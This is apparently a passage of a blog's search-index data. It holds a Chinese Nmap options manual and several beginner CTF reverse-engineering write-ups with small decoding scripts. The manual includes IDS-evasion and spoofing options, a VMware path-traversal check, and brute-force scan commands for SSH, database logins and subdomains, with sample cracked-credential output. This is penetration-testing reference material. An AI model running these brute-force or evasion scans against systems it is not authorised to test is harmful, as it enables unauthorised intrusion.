","date":"2023-11-17","objectID":"/nmap/:11:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#su-udp-扫描"},{"categories":["tools","manual"],"content":"\rsF FIN 标志的数据包扫描 BASH nmap -sF 110.130.1.43 可以看出这个扫描的话 会漏扫许多，FIN 扫描也不会在目标主机上创建日志（FIN 扫描的优势之一）。这个类型的扫描都是具有差异性的，FIN 扫描发送的包只包含 FIN 标识，NULL 扫描不发送数据包上的任何字节，XMAS 扫描发送 FIN、PSH 和 URG 标识的数据包。 ","date":"2023-11-17","objectID":"/nmap/:12:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#sf-fin-标志的数据包扫描"},{"categories":["tools","manual"],"content":"\rsV Version 版本检测扫描 BASH nmap -sV 192.168.1.135 本检测是用来扫描目标主机和端口上运行的软件的版本。它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本。使用版本检测扫描之前需要先用 TCP SYN 扫描开放了哪些端口。这个扫描的话，速度会慢一些，67.86 秒扫一个 IP。 ","date":"2023-11-17","objectID":"/nmap/:13:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#sv-version-版本检测扫描"},{"categories":["tools","manual"],"content":"\rO OS 操作系统类型的探测 BASH nmap -O 10.130.1.43 远程检测操作系统和软件，Nmap 的 OS 检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息你可以知道已知的漏洞。Nmap 有一个名为的 nmap-OS-DB 数据库，该数据库包含超过 2600 种操作系统的信息。Nmap 把 TCP 和 UDP 数据包发送到目标机器上，然后检查结果和数据库对照。 ","date":"2023-11-17","objectID":"/nmap/:14:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#o-os-操作系统类型的探测"},{"categories":["tools","manual"],"content":"\rosscan-guess 猜测匹配操作系统 CODE nmap -O --osscan-guess 192.168.1.134 通过 Nmap 准确的检测到远程操作系统是比较困难的，需要使用到 Nmap 的猜测功能选项，–osscan-guess 猜测认为最接近目标的匹配操作系统类型。 ","date":"2023-11-17","objectID":"/nmap/:15:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#osscan-guess-猜测匹配操作系统"},{"categories":["tools","manual"],"content":"\rPN No ping 扫描 BASH nmap -O -PN 192.168.1.1/24 如果远程主机有防火墙，IDS 和 IPS 系统，你可以使用 -PN 命令来确保不 ping 远程主机，因为有时候防火墙会组织掉 ping 请求。-PN 命令告诉 Nmap 不用 ping 远程主机。有时候使用 -PN 参数可以绕过 PING 命令，但是不影响主机的系统的发现。 ","date":"2023-11-17","objectID":"/nmap/:0:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#pn-no-ping-扫描"},{"categories":["tools","manual"],"content":"\rT 设置时间模板 BASH nmap -sS -T\u003c0-5\u003e 192.168.1.134 优化时间控制选项的功能很强大也很有效，但有些用户会被迷惑。此外， 往往选择合适参数的时间超过了所需优化的扫描时间。因此，Nmap 提供了一些简单的 方法，使用 6 个时间模板，使用时采用 - T 选项及数字 (0 - 5) 或名称。模板名称有 paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5) paranoid、sneaky 模式用于 IDS 躲避 Polite 模式降低了扫描 速度以使用更少的带宽和目标主机资源。 Normal 为默认模式，因此 - T3 实际上是未做任何优化。 Aggressive 模式假设用户具有合适及可靠的网络从而加速扫描. nsane 模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。 ","date":"2023-11-17","objectID":"/nmap/:0:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#t-设置时间模板"},{"categories":["tools","manual"],"content":"\r网段扫描格式 BASH nmap -sP \u003cnetwork address \u003e \u003c/CIDR \u003e 解释：CIDR 为你设置的子网掩码 (/24 , /16 ,/8 等) BASH10.1.1.0/24 = 10.1.1.1-10.1.1.255 # c段扫描 10.1.1.0/16 = 10.1.1.1-10.1.255.255 # b段扫描 10.1.1.0/8 = 10.1.1.1-10.255.255.255 # a段扫描 ","date":"2023-11-17","objectID":"/nmap/:1:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#网段扫描格式"},{"categories":["tools","manual"],"content":"\r从文件中读取需要扫描的 IP 列表 BASH nmap -iL ip-address.txt ","date":"2023-11-17","objectID":"/nmap/:2:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#从文件中读取需要扫描的-ip-列表"},{"categories":["tools","manual"],"content":"\r路由跟踪扫描路由器追踪功能，能够帮网络管理员了解网络通行情况，同时也是网络管理人员很好的辅助工具！通过路由器追踪可以轻松的查处从我们电脑所在地到目标地之间所经常的网络节点，并可以看到通过各个节点所花费的时间。 BASH nmap -traceroute www.baidu.com ","date":"2023-11-17","objectID":"/nmap/:3:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#路由跟踪扫描"},{"categories":["tools","manual"],"content":"\rA OS 识别 版本探测 脚本扫描和 traceroute 综合扫描此选项设置包含了常见的端口 ping 扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测。 BASH nmap -A 10.130.1.43 ","date":"2023-11-17","objectID":"/nmap/:4:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#a-os-识别-版本探测-脚本扫描和-traceroute-综合扫描"},{"categories":["tools","manual"],"content":"\r命令混合式扫描命令混合扫描，可以做到类似参数 -A 所完成的功能，但又能细化到我们所需特殊要求。所以一般高手选择这个混合扫描： BASH nmap -vv -p1-100,3306,3389 -O -traceroute 10.130.1.43 这些参数都是可以灵活调用的，具体根据具体的扫描来使用各个参数。 BASH nmap -p1-65535 -sV -sS -T4 10.130.1.134 使 SYN 扫描，并进行 Version 版本检测 使用 T4 (aggressive) 的时间模板对目标 IP 的全端口进行扫描。 ","date":"2023-11-17","objectID":"/nmap/:5:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#命令混合式扫描"},{"categories":["tools","manual"],"content":"\r输出格式扫描的结果输出到屏幕，同时会存储一份到 grep-output.txt BASH nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/24 输出 XML 格式： S nmap 10.0.1.0/24 -oX res.xml 扫描结果输出为 HTML 格式 BASH nmap -sS -sV -T5 10.0.1.99 --webxml -oX - | xsltproc --output file.html ","date":"2023-11-17","objectID":"/nmap/:6:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#输出格式"},{"categories":["tools","manual"],"content":"\rNmap 高级用法之脚本使用","date":"2023-11-17","objectID":"/nmap/:0:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#nmap-高级用法之脚本使用"},{"categories":["tools","manual"],"content":"\r按照脚本分类进行扫描 BASH nmap --script 类别 nmap 官方脚本文档: https://nmap.org/nsedoc/ 左侧列出了脚本的分类，点击分类可以看到每一个分类下有很多具体的脚本供我们使用。 nmap --script=类别 这里的类别，可以填写下面 14 大分类中的其中之一，也可以填写分类里面的具体漏洞扫描脚本。 Nmap 脚本分类: VERILOG- auth: 负责处理鉴权证书（绕开鉴权）的脚本 - broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务 - brute: 提供暴力破解方式，针对常见的应用如http/snmp等 - default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力 - discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等 - dos: 用于进行拒绝服务攻击 - exploit: 利用已知的漏洞入侵系统 - external: 利用第三方的数据库或资源，例如进行whois解析 - fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 - intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽 - malware: 探测目标机是否感染了病毒、开启了后门等信息 - safe: 此类与intrusive相反，属于安全性脚本 - version: 负责增强服务与版本扫描（Version Detection）功能的脚本 - vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067 ","date":"2023-11-17","objectID":"/nmap/:1:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#按照脚本分类进行扫描"},{"categories":["tools","manual"],"content":"\r使用具体脚本进行扫描 CODE nmap --script 具体的脚本 www.baidu.com ","date":"2023-11-17","objectID":"/nmap/:2:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#使用具体脚本进行扫描"},{"categories":["tools","manual"],"content":"\r常用脚本使用案例","date":"2023-11-17","objectID":"/nmap/:3:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#常用脚本使用案例"},{"categories":["tools","manual"],"content":"\r扫描服务器的常见漏洞 BASH nmap --script vuln \u003ctarget\u003e ","date":"2023-11-17","objectID":"/nmap/:3:1","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#扫描服务器的常见漏洞"},{"categories":["tools","manual"],"content":"\r检查 FTP 是否开启匿名登陆 BASHnmap --script ftp-anon \u003ctarget\u003e PORT STATE SERVICE 21/tcp open ftp | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 1170 924 31 Mar 28 2001 .banner | d--x--x--x 2 root root 1024 Jan 14 2002 bin | d--x--x--x 2 root root 1024 Aug 10 1999 etc | drwxr-srwt 2 1170 924 2048 Jul 19 18:48 incoming [NSE: writeable] | d--x--x--x 2 root root 1024 Jan 14 2002 lib | drwxr-sr-x 2 1170 924 1024 Aug 5 2004 pub |_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all. ","date":"2023-11-17","objectID":"/nmap/:3:2","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#检查-ftp-是否开启匿名登陆"},{"categories":["tools","manual"],"content":"\r对 MySQL 进行暴破解 BASHnmap --script=mysql-brute \u003ctarget\u003e 3306/tcp open mysql | mysql-brute: | Accounts | root:root - Valid credentials ","date":"2023-11-17","objectID":"/nmap/:3:3","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#对-mysql-进行暴破解"},{"categories":["tools","manual"],"content":"\r对 MSSQL 进行暴破解 BASHnmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt \u003chost\u003e | ms-sql-brute: | [192.168.100.128\\TEST] | No credentials found | Warnings: | sa: AccountLockedOut | [192.168.100.128\\PROD] | Credentials found: | webshop_reader:secret =\u003e Login Success | testuser:secret1234 =\u003e PasswordMustChange |_ lordvader:secret1234 =\u003e Login Success ","date":"2023-11-17","objectID":"/nmap/:3:4","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#对-mssql-进行暴破解"},{"categories":["tools","manual"],"content":"\r对 Oracle 数据库进行暴破解 BASHnmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL \u003chost\u003e PORT STATE SERVICE REASON 1521/tcp open oracle syn-ack | oracle-brute: | Accounts | system:powell =\u003e Account locked | haxxor:haxxor =\u003e Valid credentials | Statistics |_ Perfomed 157 guesses in 8 seconds, average tps: 19 ","date":"2023-11-17","objectID":"/nmap/:3:5","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#对-oracle-数据库进行暴破解"},{"categories":["tools","manual"],"content":"\r对 pgSQL 的暴力破解 BASHnmap -p 5432 --script pgsql-brute \u003chost\u003e 5432/tcp open pgsql | pgsql-brute: | root:\u003cempty\u003e =\u003e Valid credentials |_ test:test =\u003e Valid credentials ","date":"2023-11-17","objectID":"/nmap/:3:6","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#对-pgsql-的暴力破解"},{"categories":["tools","manual"],"content":"\r对 SSH 进行暴力破解 BASHnmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s \u003ctarget\u003e 22/ssh open ssh | ssh-brute: | Accounts | username:password | Statistics |_ Performed 32 guesses in 25 seconds. ","date":"2023-11-17","objectID":"/nmap/:3:7","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#对-ssh-进行暴力破解"},{"categories":["tools","manual"],"content":"\r利用 DNS 进行子域名暴力破解 BASHnmap --script dns-brute www.baidu.com λ nmap --script dns-brute www.baidu.com Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-25 13:12 ? Nmap scan report for www.baidu.com (180.97.33.108) Host is up (0.018s latency). Other addresses for www.baidu.com (not scanned): 180.97.33.10 Not shown: 998 filtered ports PORT STATE SERVICE 80/tcp open http 443/tcp open https Host script results: | dns-brute: | DNS Brute-force hostnames: | admin.baidu.com - 10.26.109.19 | mx.baidu.com - 61.135.163.61 | svn.baidu.com - 10.65.211.174 | ads.baidu.com - 10.42.4.225 Nmap done: 1 IP address (1 host up) scanned in 92.64 seconds ","date":"2023-11-17","objectID":"/nmap/:3:8","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#利用-dns-进行子域名暴力破解"},{"categories":["tools","manual"],"content":"\r检查 VMWare ESX，ESXi 和服务器（CVE-2009-3733）中的路径遍历漏洞 BASHnmap --script http-vmware-path-vuln -p80,443,8222,8333 \u003chost\u003e | http-vmware-path-vuln: | VMWare path traversal (CVE-2009-3733): VULNERABLE | /vmware/Windows 2003/Windows 2003.vmx | /vmware/Pentest/Pentest - Linux/Linux Pentest Bravo.vmx | /vmware/Pentest/Pentest - Windows/Windows 2003.vmx | /mnt/vmware/vmware/FreeBSD 7.2/FreeBSD 7.2.vmx | /mnt/vmware/vmware/FreeBSD 8.0/FreeBSD 8.0.vmx | /mnt/vmware/vmware/FreeBSD 8.0 64-bit/FreeBSD 8.0 64-bit.vmx |_ /mnt/vmware/vmware/Slackware 13 32-bit/Slackware 13 32-bit.vmx ","date":"2023-11-17","objectID":"/nmap/:3:9","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#检查-vmware-esxesxi-和服务器cve-2009-3733中的路径遍历漏洞"},{"categories":["tools","manual"],"content":"\r查询 VMware 服务器（vCenter，ESX，ESXi）SOAP API 以提取版本信息。 BASHλ nmap --script vmware-version -p443 10.0.1.4 Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-25 12:26 ?D1ú±ê×?ê±?? Nmap scan report for 10.0.1.4 Host is up (0.0019s latency). PORT STATE SERVICE 443/tcp open https | vmware-version: | Server version: VMware ESXi 6.5.0 | Build: 4887370 | Locale version: INTL 000 | OS type: vmnix-x86 |_ Product Line ID: embeddedEsx Service Info: CPE: cpe:/o:vmware:ESXi:6.5.0 Nmap done: 1 IP address (1 host up) scanned in 6.28 seconds ","date":"2023-11-17","objectID":"/nmap/:3:10","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#查询-vmware-服务器vcenteresxesxisoap-api-以提取版本信息"},{"categories":["tools","manual"],"content":"\r参数详解Nmap 支持主机名，网段的表示方式 例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254 VERILOG-iL filename 从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段 -iR hostnum 随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描 --exclude host1[, host2] 从扫描任务中需要排除的主机 --exculdefile exclude_file 排除文件中的IP,格式和-iL指定扫描文件的格式相同 ","date":"2023-11-17","objectID":"/nmap/:0:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#参数详解"},{"categories":["tools","manual"],"content":"\r主机发现 VERILOG-sL 仅仅是显示,扫描的IP数目,不会进行任何扫描 -sn ping扫描,即主机发现 -Pn 不检测主机存活 -PS/PA/PU/PY[portlist] TCP SYN Ping/TCP ACK Ping/UDP Ping发现 -PE/PP/PM 使用ICMP echo, timestamp and netmask 请求包发现主机 -PO[prococol list] 使用IP协议包探测对方主机是否开启 -n/-R 不对IP进行域名反向解析/为所有的IP都进行域名的反响解析 ","date":"2023-11-17","objectID":"/nmap/:1:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#主机发现"},{"categories":["tools","manual"],"content":"\r扫描技巧 VERILOG-sS/sT/sA/sW/sM TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描 -sU UDP扫描 -sN/sF/sX TCP Null，FIN，and Xmas扫描 --scanflags 自定义TCP包中的flags -sI zombie host[:probeport] Idlescan -sY/sZ SCTP INIT/COOKIE-ECHO 扫描 -sO 使用IP protocol 扫描确定目标机支持的协议类型 -b “FTP relay host” 使用FTP bounce scan ","date":"2023-11-17","objectID":"/nmap/:2:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#扫描技巧"},{"categories":["tools","manual"],"content":"\r指定端口和扫描顺序 VERILOG-p 特定的端口 -p80,443 或者 -p1-65535 -p U:PORT 扫描udp的某个端口, -p U:53 -F 快速扫描模式,比默认的扫描端口还少 -r 不随机扫描端口,默认是随机扫描的 --top-ports \"number\" 扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个 --port-ratio \"ratio\" 扫描指定频率以上的端口 ","date":"2023-11-17","objectID":"/nmap/:3:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#指定端口和扫描顺序"},{"categories":["tools","manual"],"content":"\r服务版本识别 VERILOG-sV 开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测 --version-intensity \"level\" 设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7 --version-light 打开轻量级模式,为--version-intensity 2的别名 --version-all 尝试所有探测,为--version-intensity 9的别名 --version-trace 显示出详细的版本侦测过程信息 ","date":"2023-11-17","objectID":"/nmap/:4:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#服务版本识别"},{"categories":["tools","manual"],"content":"\r脚本扫描 VERILOG-sC 根据端口识别的服务,调用默认脚本 --script=”Lua scripts” 调用的脚本名 --script-args=n1=v1,[n2=v2] 调用的脚本传递的参数 --script-args-file=filename 使用文本传递参数 --script-trace 显示所有发送和接收到的数据 --script-updatedb 更新脚本的数据库 --script-help=”Lua script” 显示指定脚本的帮助 ","date":"2023-11-17","objectID":"/nmap/:5:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#脚本扫描"},{"categories":["tools","manual"],"content":"\rOS 识别 VERILOG-O 启用操作系统检测,-A来同时启用操作系统检测和版本检测 --osscan-limit 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口) --osscan-guess 推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配 ","date":"2023-11-17","objectID":"/nmap/:6:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#os-识别"},{"categories":["tools","manual"],"content":"\r防火墙 / IDS 躲避和哄骗 VERILOG-f; --mtu value 指定使用分片、指定数据包的MTU. -D decoy1,decoy2,ME 使用诱饵隐蔽扫描 -S IP-ADDRESS 源地址欺骗 -e interface 使用指定的接口 -g/ --source-port PROTNUM 使用指定源端口 --proxies url1,[url2],... 使用HTTP或者SOCKS4的代理 --data-length NUM 填充随机数据让数据包长度达到NUM --ip-options OPTIONS 使用指定的IP选项来发送数据包 --ttl VALUE 设置IP time-to-live域 --spoof-mac ADDR/PREFIX/VEBDOR MAC地址伪装 --badsum 使用错误的checksum来发送数据包 ","date":"2023-11-17","objectID":"/nmap/:7:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#防火墙--ids-躲避和哄骗"},{"categories":["tools","manual"],"content":"\rNmap 输出 VERILOG-oN 将标准输出直接写入指定的文件 -oX 输出xml文件 -oS 将所有的输出都改为大写 -oG 输出便于通过bash或者perl处理的格式,非xml -oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出 -v 提高输出信息的详细度 -d level 设置debug级别,最高是9 --reason 显示端口处于带确认状态的原因 --open 只输出端口状态为open的端口 --packet-trace 显示所有发送或者接收到的数据包 --iflist 显示路由信息和接口,便于调试 --log-errors 把日志等级为errors/warings的日志输出 --append-output 追加到指定的文件 --resume FILENAME 恢复已停止的扫描 --stylesheet PATH/URL 设置XSL样式表，转换XML输出 --webxml 从namp.org得到XML的样式 --no-sytlesheet 忽略XML声明的XSL样式表 ","date":"2023-11-17","objectID":"/nmap/:8:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#nmap-输出"},{"categories":["tools","manual"],"content":"\r其他 Nmap 选项 VERILOG-6 开启IPv6 -A OS识别,版本探测,脚本扫描和traceroute --datedir DIRNAME 说明用户Nmap数据文件位置 --send-eth / --send-ip 使用原以太网帧发送/在原IP层发送 --privileged 假定用户具有全部权限 --unprovoleged 假定用户不具有全部权限,创建原始套接字需要root权限 -V 打印版本信息 -h 输出帮助 ","date":"2023-11-17","objectID":"/nmap/:9:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#其他-nmap-选项"},{"categories":["reverse","wp"],"content":"几道reverse基础题目wp ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:0","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#"},{"categories":["reverse","wp"],"content":"\r[SWPUCTF 2021 新生赛]re1很简单，写的c语言脚本 #include \u003cstdio.h\u003e #include \u003cstring.h\u003e int main() { char Str1[1000]; strcpy_s(Str1, sizeof(Str1), \"{34sy_r3v3rs3}\"); int i; for (i = 0; i \u003c= 665; ++i) { if (Str1[i] == '3') Str1[i] = 'e'; } for (i = 0; i \u003c= 665; ++i) { if (Str1[i] == '4') Str1[i] = 'a'; } printf(\"%s\", Str1); } Tips： ​ 1.使用strcpy函数要添加#include \u003cstring.h\u003e函数头 ​ 2.在比较新的编译器里面，会对strcpy的安全问题报错，需对strcpy进行改进： strcpy_s(str1，中间参数，str2); 中间参数的意义可以理解为：str2预计需要向str1占用多少空间 所以很显然中间参数的值的大小，必须大于等于str2的空间，但是小于等于str1空间（前提:str1\u003e=str2） 通常情况下可以写为： strcpy_s(str1，sizeof(str2)，str2); 或者strcpy_s(str1，strlen(str2)+1，str2); ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:1","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#swpuctf-2021-新生赛re1"},{"categories":["reverse","wp"],"content":"\r[NSSCTF 2022 Spring Recruit]easy C\r#include \u003cstdio.h\u003e int main() { char a[] = \"d`vxbQd\"; for (int i = 0; i \u003c 7; i++) { a[i] = a[i] ^ 2; a[i]--; } printf(\"%s\",a); } ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:2","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#nssctf-2022-spring-recruiteasy-c"},{"categories":["reverse","wp"],"content":"\r[SWPUCTF 2021 新生赛]简简单单的解密把原本的python的脚本稍作修改，再跑一遍(xor加密)得到flag import base64,urllib.parse key = \"HereIsFlagggg\" flag = \"xxxxxxxxxxxxxxxxxxx\" s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] res = [] i = j = 0 for s in flag: i = (i + 1) % 256 j = (j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] t = (s_box[i] + s_box[j]) % 256 k = s_box[t] res.append(chr(ord(s) ^ k)) cipher = \"\".join(res) crypt = (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')) enc = str(base64.b64decode(crypt),'utf-8') enc = urllib.parse.quote(enc) print(enc) # enc = %C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA 下面是修改之后的脚本： import urllib.parse key = \"HereIsFlagggg\" flag = \"%C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA\" flag =urllib.parse.unquote(flag) s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] res = [] i = j = 0 for s in flag: i = (i + 1) % 256 j = (j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] t = (s_box[i] + s_box[j]) % 256 k = s_box[t] res.append(chr(ord(s) ^ k)) cipher = \"\".join(res) print(cipher) //NSSCTF{REAL_EZ_RC4} Tips：python脚本中最下边注释掉的enc就是正确的flag之后加密的，千万不要覆盖掉 ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:3","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#swpuctf-2021-新生赛简简单单的解密"},{"categories":["reverse","wp"],"content":"\r[SWPUCTF 2021 新生赛]re2反编译，很简单的代码审计，复制改程序的代码进行修改，逆向运算进行解密 下面是C语言写的脚本 #include \u003cstdio.h\u003e int main() { char Str[] = \"ylqq]aycqyp{\"; int v7 = strlen(Str); for (int i = 0; i \u003c v7; ++i) { if ((Str[i] \u003c= 96 || Str[i] \u003e 98) \u0026\u0026 (Str[i] \u003c= 64 || Str[i] \u003e 66)) Str[i] += 2; else Str[i] -= 24; } printf(\"%s\", Str); } 但输出的flag好像有点问题，确实怪 //{nss_c{es{r},{用a替换，得到{nss_caesar}为正确答案 ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:4","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#swpuctf-2021-新生赛re2"},{"categories":["reverse","wp"],"content":"\r[GFCTF 2021]wordy非预期解：在十六进制数据对应的ASCII中发现了flag ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:5","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#gfctf-2021wordy"},{"categories":["reverse","wp"],"content":"\r[SWPUCTF 2021 新生赛]fakerandom\rappend()函数 ⽤于在列表末尾添加新的对象 random.getrandbits(k) 返回一个不大于K位的Python整数(十进制)，比如k=10，则结果是0~2^10之间的整数。 以下是算法逆向脚本： import random result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244] random.seed(1) l = [] for i in range(4): l.append(random.getrandbits(8)) flag=[] for i in range(len(l)): random.seed(l[i]) for n in range(5): flag.append(chr(result[i*5+n]^random.getrandbits(8))) print(''.join(flag)) ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:6","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#swpuctf-2021-新生赛fakerandom"},{"categories":["reverse","wp"],"content":"\r[NISACTF 2022]string #include \u003cstdio.h\u003e int main() { srand(0x2766); printf(\"NSSCTF{\"); for (int m = 0; m \u003c 13; ++m ) { printf(\"%d\", rand() % 8 + 1); } putchar('}'); } Tips：必须在Linux下运行才正确 ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:7","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#nisactf-2022string"},{"categories":["reverse","wp"],"content":"\r[NSSRound#3 Team]jump_by_jump非预期解： 预期解： IDA32位，定位到main函数，发现花指令 快捷键D转换成数据 然后nop(90) 随后一路快捷键C将黄色代码转换成数据 整理完成之后，创建函数，之后就可以进行F5反编译，得到flag ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:8","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#nssround3-teamjump_by_jump"},{"categories":["reverse","wp"],"content":"\r[WUSTCTF 2020]level2根据题目标签可知，UPX脱壳，可以用upx直接进行脱壳 upx.exe -d xxxxx.exe https://github.com/upx/upx/releases ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:9","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#wustctf-2020level2"},{"categories":["reverse","wp"],"content":"\r[SWPUCTF 2021 新生赛]fakebase题目代码 flag = 'xxxxxxxxxxxxxxxxxxx' s_box = 'qwertyuiopasdfghjkzxcvb123456#$' tmp = '' for i in flag: tmp += str(bin(ord(i)))[2:].zfill(8) b1 = int(tmp,2) s = '' while b1//31 != 0: s += s_box[b1%31] b1 = b1//31 print(s) # s = u#k4ggia61egegzjuqz12jhfspfkay 审计注释： ord(i):返回字符 `i` 的 ASCII 码值。 bin(ord(i)) 将 ASCII 码值转换为二进制数。 str(bin(ord(i))) 将二进制数转换为字符串。 [2:] 从第二个字符开始取，去除字符串开头的 '0b'。 用 0 补齐字符串的左侧，使其总长度为 8。 tmp += str(bin(ord(i)))[2:].zfill(8) 将处理结果拼接到 tmp 中。 int(tmp,2) 将 tmp 解释为二进制数，并转换为整数类型。 本题考察取模逆运算 ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:10","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#swpuctf-2021-新生赛fakebase"},{"categories":["reverse","wp"],"content":"\r[HUBUCTF 2022 新生赛]simple_RE\rmemcmp函数的原型为 int memcmp(const void *str1, const void *str2, size_t n);其功能是把存储区 str1 和存储区 str2 的前 n 个字节进行比较。该函数是按字节比较的，位于string.h。 如果返回值 \u003c 0，则表示 str1 小于 str2。 如果返回值 \u003e 0，则表示 str1 大于 str2。 如果返回值 = 0，则表示 str1 等于 str2。 通过Shift+F12查看字符串，发现两段类似base64编码的字符串，猜测base64换表，脚本如下： import base64 str1 = 